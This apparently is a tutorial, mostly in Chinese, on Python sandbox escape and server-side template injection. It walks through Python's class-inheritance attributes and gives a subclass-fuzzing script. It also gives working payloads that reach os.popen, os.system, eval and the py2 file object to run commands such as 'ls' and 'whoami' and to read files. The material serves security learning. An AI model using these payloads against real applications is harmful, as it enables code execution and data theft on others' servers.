# SSTI FUZZ 

## py 2.x 3.x

```python
search = '__builtins__'
num = -1
for i in ().__class__.__bases__[0].__subclasses__():
    num += 1
    try:
        if search in i.__init__.__globals__.keys():
            print(i, num)
    except:
        pass
```



```python
<class '_frozen_importlib._ModuleLock'> 75
<class '_frozen_importlib._DummyModuleLock'> 76
<class '_frozen_importlib._ModuleLockManager'> 77
<class '_frozen_importlib._installed_safely'> 78
<class '_frozen_importlib.ModuleSpec'> 79
<class '_frozen_importlib_external.FileLoader'> 91
<class '_frozen_importlib_external._NamespacePath'> 92
<class '_frozen_importlib_external._NamespaceLoader'> 93
<class '_frozen_importlib_external.FileFinder'> 95
<class 'codecs.IncrementalEncoder'> 102
<class 'codecs.IncrementalDecoder'> 103
<class 'codecs.StreamReaderWriter'> 104
<class 'codecs.StreamRecoder'> 105
<class 'os._wrap_close'> 127
<class '_sitebuiltins.Quitter'> 128
<class '_sitebuiltins._Printer'> 129
<class 'types.DynamicClassAttribute'> 131
<class 'types._GeneratorWrapper'> 132
<class 'warnings.WarningMessage'> 133
<class 'warnings.catch_warnings'> 134
<class 'reprlib.Repr'> 161
<class 'functools.partialmethod'> 168
<class 'contextlib._GeneratorContextManagerBase'> 170
<class 'contextlib._BaseExitStack'> 171
<class 'rlcompleter.Completer'> 172
```

### py3

```python
().__class__.__bases__[0].__subclasses__()[127].__init__.__globals__["__builtins__"]["__import__"]("os").popen("ls").read()
```

### py2

```python
().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']("__import__('os').system('whoami')")
```



-----------



# 前言

继承链这个这个词是我自己发明的。看到有的师傅博客中将它称为egg或者ssti，但是我喜欢叫它继承链因为感觉很生动。最早遇到这种姿势是在学习python bypass沙盒的时候。当时不是很理解形如`().__class__.__bases__[0].__subclasses__()`的意思。学习一段时间后，我决定来总结一下构造继承链的方法，并且用此方法在django有格式化字符串漏洞的情况下读取配置文件（灵感来自p师傅博客）。之前排版有点问题重新发一下（幸苦肉肉姐了）。

# 基础知识

## __bases__

返回一个类直接所继承的类（元组形式）

```
class Base1:
    def __init__(self):
        pass

class Base2:
    def __init__(self):
        pass

class test(Base1, Base2):
    pass

class test2(test):
    pass

print test.__bases__
print test2.__bases__
"""
(<class __main__.Base1 at 0x0322ADF8>, <class __main__.Base2 at 0x0322AE30>)
(<class __main__.test at 0x0322AE68>,)
"""
```

在看别人文章时发现__mro__和__bases__用法相同，两者具体区别， 暂时留个坑。

一些情况下也可用`__base__`直接返回单个的类

## __class__

返回一个实例所属的类

```
class Base:
    def __init__(self):
        pass

obj = Base()
print obj.__class__
"""
__main__.Base
"""
```

## __globals__

使用方式是 `函数名.__globals__`，返回一个当前空间下能使用的模块，方法和变量的字典。

```
#coding:utf-8
import os

var = 2333

def fun():
    pass

class test:
    def __init__(self):
        pass

print test.__init__.__globals__
"""
{'__builtins__': <module '__builtin__' (built-in)>, '__file__': 'backup.py', '__package__': None, 'fun': <function fun at 0x7f542e44b5f0>, 'test': <class __main__.test at 0x7f542e43b598>, 'var': 2333, '__name__': '__main__', 'os': <module 'os' from '/usr/lib/python2.7/os.pyc'>, '__doc__': None}
"""
```

## __subclasses__()

获取一个类的子类，返回的是一个列表

```
class Base1(object):
    def __init__(self):
        pass

class test(Base1):
    pass

print Base1.__subclasses__()
"""
[<class '__main__.test'>]
"""
```

## __*builtin\*_ && __builtins__

python中可以直接运行一些函数，例如`int(),list()`等等。这些函数可以在`__builtins__`中可以查到。查看的方法是`dir(__builtins__)`。在控制台中直接输入`__builtins__`会看到如下情况

```
#python2
>>> __builtins__
<module '__builtin__' (built-in)>
```

*ps：在py3中__builtin__被换成了builtin*

`__builtin__` 和 `__builtins__`之间是什么关系呢？

1、在主模块`main`中，`__builtins__`是对内建模块`__builtin__`本身的引用，即`__builtins__`完全等价于`__builtin__`，二者完全是一个东西，不分彼此。

2、非主模块`main`中，`__builtins__`仅是对`__builtin__.__dict__`的引用，而非`__builtin__`本身

# 继承链bypass沙盒

## 用file对象读取文件

构造继承链的一种思路是：

1. 随便找一个内置类对象用`__class__`拿到他所对应的类
2. 用`__bases__`拿到基类（`<class 'object'>`）
3. 用`__subclasses__()`拿到子类列表
4. 在子类列表中直接寻找可以利用的类

一言敝之

```
().__class__.__base__.__subclasses__()
().__class__.__bases__[0].__subclasses__()
```

可以看到列表里面有一坨，这里只看file对象。

```
[...,<type 'file'>, ...]
```

查找`file`位置。

```
#coding:utf-8

search = 'file'
num = 0
for i in ().__class__.__bases__[0].__subclasses__():
    if 'file' in str(i):
        print num
    num += 1
<type 'file'>`在第40位。`().__class__.__bases__[0].__subclasses__()[40]
```

用`dir`来看看内置的方法

```
dir(().__class__.__bases__[0].__subclasses__()[40])
['__class__', '__delattr__', '__doc__', '__enter__', '__exit__', '__format__', '__getattribute__', '__hash__', '__init__', '__iter__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'close', 'closed', 'encoding', 'errors', 'fileno', 'flush', 'isatty', 'mode', 'name', 'newlines', 'next', 'read', 'readinto', 'readline', 'readlines', 'seek', 'softspace', 'tell', 'truncate', 'write', 'writelines', 'xreadlines']
```

所以最终的payload是

```
().__class__.__bases__[0].__subclasses__()[40]('filename').readlines()
```

然后用同样的手法可以得到`__mro__`形式下的payload

```
().__class__.__mro__[1].__subclasses__()[40]('filename').readlines()
```

这种方法等价于

```
file('backup.py').readlines()
```

**但是python3已经移除了file。所以第一种方法只能在py2中用。**

## 用内置模块执行命令

第二种方法接着第一种的思路接着探索。第一种止步于把内置的对象列举出来，其实可以用`__globals__`更深入的去看每个类可以调用的东西（包括模块，类，变量等等），万一有`os`这种东西就赚了。

```
#coding:utf-8

search = 'os'   #也可以是其他你想利用的模块
num = -1
for i in ().__class__.__bases__[0].__subclasses__():
    num += 1
    try:
        if search in i.__init__.__globals__.keys():
            print(i, num)
    except:
        pass 
"""
(<class 'site._Printer'>, 72)
(<class 'site.Quitter'>, 77)
"""
().__class__.__mro__[1].__subclasses__()[77].__init__.__globals__['os'].system('whoami')
().__class__.__mro__[1].__subclasses__()[72].__init__.__globals__['os'].system('whoami')
```

**不过很可惜上述的方法也只能在py2中使用。**